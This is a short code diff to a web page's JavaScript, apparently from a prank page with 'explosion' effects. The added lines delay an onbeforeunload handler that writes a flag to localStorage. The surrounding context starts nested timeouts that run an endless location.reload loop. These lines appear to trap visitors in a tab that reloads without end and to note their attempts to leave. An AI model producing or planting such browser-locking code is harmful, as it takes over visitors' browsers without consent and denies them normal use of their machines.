@@ -500,7 +500,12 @@
                 setTimeout(() => explosion.remove(), 2000);
             }
         });
-        onbeforeunload = function(){ localStorage.x = 1; };
+      setTimeout(function() {
+  window.onbeforeunload = function() {
+    localStorage.x = 1;
+  };
+}, 1000);
+
 setTimeout(function() {
     setTimeout(function(){
         while(1) location.reload(1);
